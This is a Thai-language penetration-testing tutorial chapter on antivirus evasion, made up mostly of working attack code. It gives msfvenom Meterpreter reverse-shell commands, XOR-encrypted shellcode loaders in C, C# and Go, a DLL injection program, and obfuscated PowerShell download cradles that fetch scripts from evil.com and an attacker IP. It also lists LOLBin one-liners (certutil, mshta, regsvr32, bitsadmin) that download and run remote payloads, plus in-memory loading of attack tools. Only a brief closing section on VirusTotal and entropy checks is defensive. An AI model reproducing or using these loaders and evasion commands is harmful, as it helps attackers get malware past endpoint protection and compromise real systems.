# Part 41: AV Evasion - เทคนิคหลบเลี่ยง Antivirus

## สารบัญ
1. [ทำความเข้าใจ AV Detection](#1-ทำความเข้าใจ-av-detection)
2. [Encoding และ Encryption](#2-encoding-และ-encryption)
3. [Payload Obfuscation](#3-payload-obfuscation)
4. [Custom Shellcode Loader](#4-custom-shellcode-loader)
5. [Process Injection](#5-process-injection)
6. [Metasploit Evasion](#6-metasploit-evasion)
7. [In-Memory Execution](#7-in-memory-execution)
8. [Living off the Land (LOL)](#8-living-off-the-land-lol)
9. [การทดสอบ และ VirusTotal](#9-การทดสอบ-และ-virustotal)
10. [แบบฝึกหัด Lab](#10-แบบฝึกหัด-lab)

---

## 1. ทำความเข้าใจ AV Detection

### วิธีการตรวจจับของ AV

```
1. Signature Detection:
   - เปรียบ hash หรือ byte patterns
   - ตรวจสอบกับ database ของ known malware
   - Bypass: เปลี่ยน bytes (เขียนใหม่, encrypt)

2. Heuristic Detection:
   - ตรวจสอบ behaviour patterns
   - เช่น VirtualAlloc+WriteMemory+CreateThread
   - Bypass: ใช้ indirect API calls, syscalls

3. Behavioral Detection (Sandbox/EDR):
   - เปิด file แล้วดู runtime behavior
   - Bypass: sleep, environment checks, anti-sandbox

4. Machine Learning:
   - วิเคราะห์คุณลักษณะไฟล์
   - Bypass: หลอก entropy, PE structure
```

---

## 2. Encoding และ Encryption

### msfvenom Encoders

```bash
# ดู encoders ที่มี
msfvenom -l encoders | grep good
# Excellent: x86/shikata_ga_nai
# Good: x64/xor, x86/xor

# ใช้ shikata_ga_nai (polymorphic XOR)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -e x64/xor_dynamic \
  -i 10 \
  -f exe -o encoded.exe

# ใช้หลาย encoders
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -e x64/xor -i 5 \
  -e x64/xor_dynamic -i 5 \
  -f exe -o multi_encoded.exe

# หมายเหตุ: encoding เพียงอย่างเดียวไม่ใช้ bypass modern AV
# ต้องใช้ร่วมกับเทคนิคอื่นๆ
```

### Custom XOR Encryption

```python
#!/usr/bin/env python3
# xor_encrypt.py
import os

# Original shellcode (msfvenom raw)
with open('shellcode.bin', 'rb') as f:
    shellcode = f.read()

# Generate random XOR key
key = os.urandom(16)

# XOR encrypt
encrypted = bytearray()
for i, byte in enumerate(shellcode):
    encrypted.append(byte ^ key[i % len(key)])

# Output C array
print("unsigned char key[] = {")
print(", ".join([f"0x{b:02x}" for b in key]))
print("};")

print("\nunsigned char shellcode[] = {")
print(", ".join([f"0x{b:02x}" for b in encrypted]))
print("};")
```

### C Loader + XOR Decryption

```c
// loader.c - Decrypt และ execute shellcode
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>

// Encrypted shellcode จาก xor_encrypt.py
unsigned char key[] = {0x12, 0x34, 0x56, 0x78, 0x9a, 0xbc, 0xde, 0xf0,
                        0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88};

unsigned char shellcode[] = {0xAB, 0xCD, ...};  // encrypted bytes
int shellcode_len = sizeof(shellcode);

int main() {
    // Anti-sandbox: sleep 30 seconds first
    Sleep(30000);
    
    // Decrypt XOR
    for (int i = 0; i < shellcode_len; i++) {
        shellcode[i] ^= key[i % sizeof(key)];
    }
    
    // Allocate executable memory
    LPVOID mem = VirtualAlloc(NULL, shellcode_len,
                              MEM_COMMIT | MEM_RESERVE,
                              PAGE_EXECUTE_READWRITE);
    
    // Copy shellcode
    memcpy(mem, shellcode, shellcode_len);
    
    // Execute
    HANDLE thread = CreateThread(NULL, 0,
                                  (LPTHREAD_START_ROUTINE)mem,
                                  NULL, 0, NULL);
    WaitForSingleObject(thread, INFINITE);
    
    VirtualFree(mem, 0, MEM_RELEASE);
    return 0;
}

// คอมไฟล์
// x86_64-w64-mingw32-gcc loader.c -o loader.exe -lws2_32
```

---

## 3. Payload Obfuscation

### PowerShell Obfuscation

```powershell
# Original (detect ได้ง่าย)
IEX (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')

# Obfuscated 1: Base64
$cmd = 'IEX (New-Object Net.WebClient).DownloadString("http://evil.com/shell.ps1")'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
powershell -EncodedCommand $encoded

# Obfuscated 2: String splitting
$c = 'IE'+'X '+'(N'+'ew'+'-O'+'bj'+'ec'+'t N'+'et.W'+'eb'+'Cl'+'ie'+'nt).D'+'own'+'lo'+'ad'+'St'+'ri'+'ng'
iex "$c('http://evil.com/shell.ps1')"

# Obfuscated 3: Char codes
$c = [char]73+[char]69+[char]88  # 'IEX'
iex "$c ..."

# Obfuscated 4: Invoke-Expression aliases
& ( $ShellID[1]+$ShellID[13]+'x') ...
```

### Invoke-Obfuscation

```powershell
# ใช้ Invoke-Obfuscation tool
Import-Module Invoke-Obfuscation.psd1
Invoke-Obfuscation

# Menu:
# TOKEN   = Obfuscate via token manipulation
# STRING  = Obfuscate via string manipulation
# ENCODING = Obfuscate via encoding
# COMPRESS = Obfuscate via compression
# LAUNCHER = Obfuscate via launcher

# Example:
SET SCRIPTPATH http://evil.com/shell.ps1
ENCODING
3  # AES
OUT C:\output.ps1
```

---

## 4. Custom Shellcode Loader

### C# Loader (Bypass Windows Defender)

```csharp
// loader.cs
using System;
using System.Runtime.InteropServices;

class Program {
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress,
        IntPtr lpParameter, uint dwCreationFlags,
        IntPtr lpThreadId);
    
    [DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
    
    static void Main() {
        // msfvenom shellcode (Base64 encoded)
        string b64 = "AABBCCDDEEFF...";  // Base64 shellcode
        byte[] shellcode = Convert.FromBase64String(b64);
        
        // XOR decrypt
        byte xorKey = 0x41;
        for (int i = 0; i < shellcode.Length; i++)
            shellcode[i] ^= xorKey;
        
        IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length,
                                   0x1000 | 0x2000, 0x40);
        Marshal.Copy(shellcode, 0, mem, shellcode.Length);
        
        IntPtr thread = CreateThread(IntPtr.Zero, 0, mem,
                                      IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(thread, 0xFFFFFFFF);
    }
}

// Compile:
// csc.exe /target:exe loader.cs
// หรือ
// mcs loader.cs -out:loader.exe
```

### Go Loader (Low AV Detection)

```go
// loader.go
package main

import (
    "encoding/base64"
    "syscall"
    "unsafe"
)

func main() {
    // Base64 encoded + XOR shellcode
    b64 := "AABBCCDDEEFF..."  // ใส่ shellcode
    decoded, _ := base64.StdEncoding.DecodeString(b64)
    
    // XOR decrypt
    for i := range decoded {
        decoded[i] ^= 0x41
    }
    
    kernel32 := syscall.NewLazyDLL("kernel32.dll")
    virtualAlloc := kernel32.NewProc("VirtualAlloc")
    createThread := kernel32.NewProc("CreateThread")
    waitForSingleObject := kernel32.NewProc("WaitForSingleObject")
    
    mem, _, _ := virtualAlloc.Call(
        0, uintptr(len(decoded)),
        0x3000, 0x40,
    )
    
    for i, b := range decoded {
        *(*byte)(unsafe.Pointer(mem + uintptr(i))) = b
    }
    
    thread, _, _ := createThread.Call(
        0, 0, mem, 0, 0, 0,
    )
    waitForSingleObject.Call(thread, 0xFFFFFFFF)
}

// Compile:
// GOOS=windows GOARCH=amd64 go build -o loader.exe loader.go
```

---

## 5. Process Injection

### Classic DLL Injection

```c
// dll_inject.c
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD GetPID(const char* procName) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = {sizeof(PROCESSENTRY32)};
    
    if (Process32First(snapshot, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, procName) == 0) {
                CloseHandle(snapshot);
                return pe.th32ProcessID;
            }
        } while (Process32Next(snapshot, &pe));
    }
    CloseHandle(snapshot);
    return 0;
}

int main() {
    const char* targetProc = "notepad.exe";
    const char* dllPath = "C:\\malicious.dll";
    
    DWORD pid = GetPID(targetProc);
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    
    // Allocate memory in target process
    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, strlen(dllPath)+1,
                                       MEM_COMMIT, PAGE_READWRITE);
    
    // Write DLL path
    WriteProcessMemory(hProcess, remoteMem, dllPath, strlen(dllPath)+1, NULL);
    
    // Get LoadLibrary address
    HMODULE kernel32 = GetModuleHandle("kernel32.dll");
    LPVOID loadLib = GetProcAddress(kernel32, "LoadLibraryA");
    
    // Create remote thread to load DLL
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                         (LPTHREAD_START_ROUTINE)loadLib,
                                         remoteMem, 0, NULL);
    
    WaitForSingleObject(hThread, INFINITE);
    VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    
    return 0;
}
```

### Process Hollowing

```c
// เขียนลงใน process ที่ถูกต้อง (eg. svchost.exe)
// 1. CreateProcess in SUSPENDED state
// 2. Unmap original executable
// 3. Write malicious code
// 4. Fix PE headers
// 5. Resume thread

// หลักการ:
// Legitimate process อยู่ใน memory
// แต่เนื้อหาเป็น malicious code
// AV เห็นว่า svchost.exe - trust

#include <windows.h>

void HollowProcess(BYTE* payload, DWORD payloadSize) {
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    
    // Create suspended process
    CreateProcessA("C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL,
                   FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    
    // ... (complex implementation)
    // ดูตัวอย่าง complete code ใน exploit frameworks
    
    ResumeThread(pi.hThread);
}
```

---

## 6. Metasploit Evasion

```bash
# ใช้ msfvenom แบบ advanced

# Template executable (รวม shellcode ใน .exe จริง)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -x /usr/share/windows-resources/binaries/plink.exe \
  -f exe -o disguised.exe

# Format: ลอง format ต่างๆ
# -f vba (Office macro)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f vba -o macro.vba

# -f hta-psh (HTML Application)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f hta-psh -o shell.hta

# use evasion module
use evasion/windows/applocker_evasion_install_util
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
run
```

### MSFVenom + Veil

```bash
# ติดตั้ง Veil
cd /opt && git clone https://github.com/Veil-Framework/Veil
cd Veil && ./config/setup.sh -s

# เริ่มใช้งาน
veil
# Veil-Evasion:
# use 1  (Evasion)
# list
# use python/shellcode_inject/aes_encrypt.py
# set LHOST 192.168.1.100
# set LPORT 4444
# generate
# 1  (msfvenom shellcode)
# 4  (windows/x64/meterpreter/reverse_tcp)
```

---

## 7. In-Memory Execution

### PowerShell In-Memory

```powershell
# ดาวน์โหลดและ execute โดยไม่บันทึก disk
# (Fileless malware)

$url = 'http://192.168.1.100/shell.ps1'
$wc = New-Object System.Net.WebClient
$code = $wc.DownloadString($url)
Invoke-Expression $code

# หรือสั้นกว่า
iex (iwr http://192.168.1.100/shell.ps1 -usebasicparsing)

# Reflective DLL loading
$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.1.100/malicious.dll')
$assembly = [System.Reflection.Assembly]::Load($bytes)
$assembly.EntryPoint.Invoke($null, $null)
```

### .NET Assembly ใน Memory

```powershell
# Covenant, Havoc, หรือ Cobalt Strike
# ใช้เทคนิคนี้สำหรับ C2 frameworks

# Rubeus (C# AD attack tool) - run ใน memory
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.1.100/Rubeus.exe')
[System.Reflection.Assembly]::Load($data).EntryPoint.Invoke($null, @(,[string[]]@('kerberoast')))
```

---

## 8. Living off the Land (LOL)

```bash
# ใช้ Windows built-in tools เพื่อเลี่ยงการตรวจจับ
# เช่น certutil, mshta, wscript, cscript, regsvr32

# certutil - ดาวน์โหลดไฟล์
certutil -urlcache -split -f http://192.168.1.100/shell.exe C:\shell.exe
certutil -encode shell.exe encoded.txt  # Base64 encode

# mshta - execute HTA
mshta http://192.168.1.100/shell.hta
mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run(""cmd.exe"")")

# wscript/cscript - execute JS/VBS
wscript //B http://192.168.1.100/shell.js
cscript //nologo C:\shell.vbs

# regsvr32 - เรียก DLL โดยไม่ต้อง admin
regsvr32 /s /n /u /i:http://192.168.1.100/shell.sct scrobj.dll

# rundll32
rundll32.exe javascript:"..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://evil.com/shell.sct")

# PowerShell bypass execution policy
powershell -ExecutionPolicy Bypass -File shell.ps1
powershell -ep bypass -enc BASE64_COMMAND
```

### LOLBins - Windows

```powershell
# msiexec - execute MSI
msiexec /quiet /qn /i http://evil.com/shell.msi

# bitsadmin - download file
bitsadmin /transfer evil_job /download /priority normal http://evil.com/shell.exe C:\shell.exe

# ie4uinit - execute INF
ie4uinit.exe -BaseSettings  # + malicious INF

# forfiles - execute command
forfiles /p C:\Windows\System32 /m notepad.exe /c "cmd.exe /c calc.exe"

# ดู LOLBins เพิ่มเติมที่:
# https://lolbas-project.github.io/
```

---

## 9. การทดสอบ และ VirusTotal

```bash
# VirusTotal - ทดสอบกับ 70+ AV engines
# หมายเหตุ: อย่าอัปโหลด payload จริง!
# payload จะถูกเพิ่มใน database
# ใช้แค่สำหรับ CTF/training

# ทดสอบบนเครื่อง (offline)
# Antiscan.me, Nodistribute.com - ไม่ submit ไป VT

# ตรวจสอบด้วย ClamAV (เครื่องบน Kali)
apt install clamav
freshclam  # update signatures
clamscan -v malware.exe

# ตรวจสอบด้วย strings analysis
strings malware.exe | grep -E '(http|cmd|powershell|wscript)'

# Detect packing/obfuscation
peid malware.exe  # หา packer
ExeinfoPE malware.exe

# Python ตรวจสอบ entropy
python3 << 'EOF'
import math

def entropy(data):
    if not data:
        return 0
    freq = [0] * 256
    for b in data:
        freq[b] += 1
    
    ent = 0
    for f in freq:
        if f:
            p = f / len(data)
            ent -= p * math.log2(p)
    return ent

with open('malware.exe', 'rb') as f:
    data = f.read()
    
print(f"Entropy: {entropy(data):.2f}/8.0")
print("High entropy (>7.0) = likely packed/encrypted")
EOF
```

---

## 10. แบบฝึกหัด Lab

### Lab 1: XOR Encrypted Shellcode Loader

```python
#!/usr/bin/env python3
# lab1_generate.py - สร้าง XOR encrypted shellcode
import os
import subprocess

# Step 1: สร้าง shellcode (Linux x86 execve /bin/sh)
shellcode = bytes([
    0x31, 0xc0,         # xor eax, eax
    0x50,               # push eax
    0x68, 0x2f, 0x2f,   # push '//sh'
    0x73, 0x68,
    0x68, 0x2f, 0x62,   # push '/bin'
    0x69, 0x6e,
    0x89, 0xe3,         # mov ebx, esp
    0x50,               # push eax
    0x89, 0xe2,         # mov edx, esp
    0x53,               # push ebx
    0x89, 0xe1,         # mov ecx, esp
    0xb0, 0x0b,         # mov al, 11
    0xcd, 0x80          # int 0x80
])

# Step 2: XOR encrypt
key = 0xAA
encrypted = bytes([b ^ key for b in shellcode])

# Step 3: เขียน C loader
loader_c = f"""
#include <string.h>
#include <sys/mman.h>

unsigned char shellcode[] = {{{', '.join([f'0x{b:02x}' for b in encrypted])}}};
int len = {len(encrypted)};
int main() {{
    // Decrypt
    for (int i = 0; i < len; i++) shellcode[i] ^= 0x{key:02x};
    
    // Execute
    void *mem = mmap(0, len, PROT_READ|PROT_WRITE|PROT_EXEC,
                     MAP_SHARED|MAP_ANONYMOUS, -1, 0);
    memcpy(mem, shellcode, len);
    ((void(*)())mem)();
    return 0;
}}
"""

with open('loader.c', 'w') as f:
    f.write(loader_c)

print("[+] loader.c created")
print("[+] Compile: gcc -m32 -o loader loader.c")
print("[+] Run: ./loader")
```

### Lab 2: PowerShell Bypass AV

```powershell
# ทดสอบบน Windows VM

# Step 1: ดู execution policy
Get-ExecutionPolicy
# Restricted

# Step 2: Bypass และ run script ใน memory
powershell -ExecutionPolicy Bypass -NoProfile -Command "IEX ((New-Object Net.WebClient).DownloadString('http://192.168.1.100/test.ps1'))"

# Step 3: Base64 encode
$cmd = "Write-Host 'Hello from encoded PS!'"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
powershell -EncodedCommand $encoded
```

---

## สรุป

| เทคนิค | วิธีการ | ประสิทธิภาพ |
|---------|-----------|----------|
| Encoding | shikata_ga_nai | ต่ำ |
| XOR Encrypt | Custom loader | ปานกลาง |
| Process Injection | DLL inject, hollow | สูง |
| In-Memory | PowerShell, .NET | สูง |
| LOLBins | certutil, mshta | สูง |
| Custom Go/C# loader | Native code | สูงมาก |

---

**ต่อไป:** [Part 42 - Web Application Firewall Bypass](Part-42-WAF-Bypass.md)
